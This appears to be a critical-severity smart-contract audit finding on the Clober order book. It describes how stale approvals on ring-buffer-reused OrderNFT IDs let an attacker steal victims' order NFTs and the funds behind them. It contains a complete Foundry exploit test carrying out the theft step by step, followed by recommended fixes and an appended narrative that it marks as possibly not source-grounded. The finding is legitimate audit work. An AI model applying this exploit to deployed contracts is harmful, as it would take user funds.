---
id: 6548
severity: "Critical"
---

# OrderNFT theft due to controlling future and past tokens of same order index

## Description

The order queue is implemented as a ring buffer, to get an order (Orderbook.getOrder) the index in the queue is computed as orderIndex % _MAX_ORDER. The owner of an OrderNFT also uses this function.
```solidity
function _getOrder(OrderKey calldata orderKey) internal view returns (Order storage) {
    return _getQueue(orderKey.isBid, orderKey.priceIndex).orders[orderKey.orderIndex & _MAX_ORDER_M];
}
CloberOrderBook(market).getOrder(decodeId(tokenId)).owner
```
Therefore, the current owner of the NFT of orderIndex also owns all NFTs with orderIndex + k * _MAX_ORDER. An attacker can set approvals of future token IDs to themself. These approvals are not cleared on OrderNFT.onMint when a victim mints this future token ID, allowing the attacker to steal the NFT and cancel the NFT to claim their tokens.
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../../../../contracts/interfaces/CloberMarketSwapCallbackReceiver.sol";
import "../../../../contracts/mocks/MockQuoteToken.sol";
import "../../../../contracts/mocks/MockBaseToken.sol";
import "../../../../contracts/mocks/MockOrderBook.sol";
import "../../../../contracts/markets/VolatileMarket.sol";
import "../../../../contracts/OrderNFT.sol";
import "../utils/MockingFactoryTest.sol";
import "./Constants.sol";
contract ExploitsTest is Test, CloberMarketSwapCallbackReceiver, MockingFactoryTest {
    struct Return {
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint256 amountOut;
        uint256 refundBounty;
    }
    struct Vars {
        uint256 inputAmount;
        uint256 outputAmount;
        uint256 beforePayerQuoteBalance;
        uint256 beforePayerBaseBalance;
        uint256 beforeTakerQuoteBalance;
        uint256 beforeOrderBookEthBalance;
    }
    MockQuoteToken quoteToken;
    MockBaseToken baseToken;
    MockOrderBook orderBook;
    OrderNFT orderToken;
    function setUp() public {
        quoteToken = new MockQuoteToken();
        baseToken = new MockBaseToken();
    }
    function cloberMarketSwapCallback(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOut,
        bytes calldata data
    ) external payable {
        if (data.length != 0) {
            Return memory expectedReturn = abi.decode(data, (Return));
            assertEq(tokenIn, expectedReturn.tokenIn, "ERROR_TOKEN_IN");
            assertEq(tokenOut, expectedReturn.tokenOut, "ERROR_TOKEN_OUT");
            assertEq(amountIn, expectedReturn.amountIn, "ERROR_AMOUNT_IN");
            assertEq(amountOut, expectedReturn.amountOut, "ERROR_AMOUNT_OUT");
            assertEq(msg.value, expectedReturn.refundBounty, "ERROR_REFUND_BOUNTY");
        }
        IERC20(tokenIn).transfer(msg.sender, amountIn);
    }
    function _createOrderBook(int24 makerFee, uint24 takerFee) private {
        orderToken = new OrderNFT();
        orderBook = new MockOrderBook(
            address(orderToken),
            address(quoteToken),
            address(baseToken),
            1,
            10**4,
            makerFee,
            takerFee,
            address(this)
        );
        orderToken.init("", "", address(orderBook), address(this));
        uint256 _quotePrecision = 10**quoteToken.decimals();
        quoteToken.mint(address(this), 1000000000 * _quotePrecision);
        quoteToken.approve(address(orderBook), type(uint256).max);
        uint256 _basePrecision = 10**baseToken.decimals();
        baseToken.mint(address(this), 1000000000 * _basePrecision);
        baseToken.approve(address(orderBook), type(uint256).max);
    }
    function _buildLimitOrderOptions(bool isBid, bool postOnly) private pure returns (uint8) {
        return (isBid ? 1 : 0) + (postOnly ? 2 : 0);
    }
    uint256 private constant _MAX_ORDER = 2**15; // 32768
    uint256 private constant _MAX_ORDER_M = 2**15 - 1; // % 32768
    function testExploit2() public {
        _createOrderBook(0, 0);
        address attacker = address(0x1337);
        address attacker2 = address(0x1338);
        address victim = address(0xbabe);
        // Step 1. Attacker creates an ASK limit order and receives NFT
        uint16 priceIndex = 100;
        uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({
            user: attacker,
            priceIndex: priceIndex,
            rawAmount: 0,
            baseAmount: 1e18,
            options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY),
            data: new bytes(0)
        });
        // Step 2. Given the `OrderKey` which represents the created limit order, an attacker can craft ambiguous tokenIds
        CloberOrderBook.OrderKey memory orderKey =
            CloberOrderBook.OrderKey({isBid: false, priceIndex: priceIndex, orderIndex: orderIndex});
        uint256 currentTokenId = orderToken.encodeId(orderKey);
        orderKey.orderIndex += _MAX_ORDER;
        uint256 futureTokenId = orderToken.encodeId(orderKey);
        // Step 3. Attacker approves the futureTokenId to themself, and cancels the current id
        vm.startPrank(attacker);
        orderToken.approve(attacker2, futureTokenId);
        CloberOrderBook.OrderKey[] memory orderKeys = new CloberOrderBook.OrderKey[](1);
        orderKeys[0] = orderKey;
        orderKeys[0].orderIndex = orderIndex; // restore original orderIndex
        orderBook.cancel(attacker, orderKeys);
        vm.stopPrank();
        // Step 4. attacker fills queue, victim creates their order recycles orderIndex 0
        uint256 victimOrderSize = 1e18;
        for(uint256 i = 0; i < _MAX_ORDER; i++) {
            orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({
                user: i < _MAX_ORDER - 1 ? attacker : victim,
                priceIndex: priceIndex,
                rawAmount: 0,
                baseAmount: victimOrderSize,
                options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY),
                data: new bytes(0)
            });
        }
        assertEq(orderToken.ownerOf(futureTokenId), victim);
        // Step 5. Attacker steals the NFT and can cancel to receive the tokens
        vm.startPrank(attacker2);
        orderToken.transferFrom(victim, attacker, futureTokenId);
        vm.stopPrank();
        assertEq(orderToken.ownerOf(futureTokenId), attacker);
        uint256 baseBalanceBefore = baseToken.balanceOf(attacker);
        vm.startPrank(attacker);
        orderKeys[0].orderIndex = orderIndex + _MAX_ORDER;
        orderBook.cancel(attacker, orderKeys);
        vm.stopPrank();
        assertEq(baseToken.balanceOf(attacker) - baseBalanceBefore, victimOrderSize);
    }
}
```

## Proof of Concept

no poc

## Recommendation

The approvals should be cleared on onMint, similar to onBurn. The owner must not control any future or past, already burned, tokens that map to the same index mod _MAX_ORDER. This must be fully prevented to mitigate this attack. Revert in getOrder if the orderKey maps to an NFT that has already been burned or not been minted yet. See Order owner isn't zeroed after burning's recommendation to correctly detect burned tokens.
```solidity
function onMint(
    address to,
    bool isBid,
    uint16 priceIndex,
    uint256 orderIndex
) external onlyOrderBook {
    require(to != address(0), Errors.EMPTY_INPUT);
    uint256 tokenId = _encodeId(isBid, priceIndex, orderIndex);
    // Clear approvals
    _approve(to, address(0), tokenId);
    _increaseBalance(to);
    emit Transfer(address(0), to, tokenId);
}
function _getOrder(OrderKey calldata orderKey) internal view returns (Order storage) {
    uint256 currentIndex = _getQueue(orderKey.isBid, orderKey.priceIndex).index;
    // valid active tokens are [currentIndex - _MAX_ORDER, currentIndex)
    require(orderKey.orderIndex < currentIndex, Errors.NFT_INVALID_ID);
    if (currentIndex >= _MAX_ORDER) {
        require(orderKey.orderIndex >= currentIndex - _MAX_ORDER, Errors.NFT_INVALID_ID);
    }
    return _getQueue(orderKey.isBid, orderKey.priceIndex).orders[orderKey.orderIndex & _MAX_ORDER_M];
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability originates from the way the order book stores orders in a fixed‑size ring buffer and derives the OrderNFT identifier from the order index using a modulo operation (orderIndex % _MAX_ORDER). Because the same logical index repeats every _MAX_ORDER slots, the owner of an NFT for a given orderIndex also implicitly controls the NFTs whose indices are orderIndex + k*_MAX_ORDER. The contract does not clear token approvals when a new OrderNFT is minted; approvals are only cleared on burn. Consequently, an attacker can pre‑approve a future token ID that has not yet been minted, then wait for the order queue to wrap around and for a victim to receive that future token. When the victim mints the token, the stale approval remains, allowing the attacker to transfer the NFT from the victim and subsequently cancel the order to claim the underlying base tokens. This attack can be carried out whenever the order queue reaches its maximum size and starts reusing indices, which is a normal operating condition for a high‑throughput market. The impact is that an attacker can steal ownership of a legitimate order NFT, cancel the order, and extract the funds that belong to the original order creator, effectively causing loss of assets for users and undermining trust in the protocol. The issue was discovered during a security audit that examined the mapping between order indices and NFT identifiers and noticed that approvals were not reset on mint. It is subtle because the token IDs appear distinct and the approval mechanism works as expected for already‑minted tokens, making the cross‑index relationship hard to spot without understanding the modulo indexing. To remediate, the contract should clear approvals during the onMint hook, enforce that an orderKey maps to an active, unburned token before allowing any operation, and reject requests that refer to indices outside the current valid window of the ring buffer. This eliminates the ability to pre‑approve future tokens and prevents an attacker from hijacking orders that reuse the same modulo index, restoring the intended ownership and accounting guarantees of the market.
